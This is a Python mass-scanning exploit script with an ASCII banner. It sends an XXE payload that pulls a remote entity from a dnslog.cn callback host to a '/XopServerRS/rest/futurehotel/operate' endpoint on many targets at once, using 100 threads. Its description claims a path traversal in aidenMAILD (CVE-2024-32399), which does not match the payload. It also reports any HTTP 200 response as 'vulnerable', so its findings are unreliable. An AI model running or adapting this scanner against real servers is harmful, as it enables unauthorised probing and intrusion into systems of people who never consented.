import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
                                                                                                          
                                                                                                      
                                                                                                      
             ,--,                                                                                     
           ,--.'|    __  ,-.         ,--,                    ,---,                   ,--,      ,---,  
 ,--,  ,--,|  |,   ,' ,'/ /|       ,'_ /|                ,-+-. /  |                ,'_ /|  ,-+-. /  | 
 |'. \/ .`|`--'_   '  | |' |  .--. |  | :    ,--.--.    ,--.'|'   |     .--,  .--. |  | : ,--.'|'   | 
 '  \/  / ;,' ,'|  |  |   ,','_ /| :  . |   /       \  |   |  ,"' |   /_ ./|,'_ /| :  . ||   |  ,"' | 
  \  \.' / '  | |  '  :  /  |  ' | |  . .  .--.  .-. | |   | /  | |, ' , ' :|  ' | |  . .|   | /  | | 
   \  ;  ; |  | :  |  | '   |  | ' |  | |   \__\/: . . |   | |  | /___/ \: ||  | ' |  | ||   | |  | | 
  / \  \  \'  : |__;  : |   :  | : ;  ; |   ," .--.; | |   | |  |/ .  \  ' |:  | : ;  ; ||   | |  |/  
./__;   ;  \  | '.'|  , ;   '  :  `--'   \ /  /  ,.  | |   | |--'   \  ;   :'  :  `--'   \   | |--'   
|   :/\  \ ;  :    ;---'    :  ,      .-./;  :   .'   \|   |/        \  \  ;:  ,      .-./   |/       
`---'  `--`|  ,   /          `--`----'    |  ,     .-./'---'          :  \  \`--`----'   '---'        
            ---`-'                         `--`---'                    \  ' ;                         
                                                                        `--`                          


    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="aidenMAILD 邮件服务器 路径遍历漏洞(CVE-2024-32399)")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/XopServerRS/rest/futurehotel/operate"
    headers = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_12_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/108.0.3157.54Safari/537.36",
        "Connection": "close",
        "Content-Type": "text/xml",
        "Accept-Encoding": "gzip",
        "Content-Length": "80",
    }
    data = '<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xxx.dnslog.cn"> %remote;]>'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False)
        if res1.status_code == 200:
            logger.info(f"[+] {target} 存在漏洞")
            with open("XMSresult.txt", 'a', encoding='utf-8') as f:
                f.write(target + '\n')
            return False
    except Exception as e:
        logger.error(f"[-] 该 {target} 请求失败: {e}")
        return False


if __name__ == '__main__':
    main()
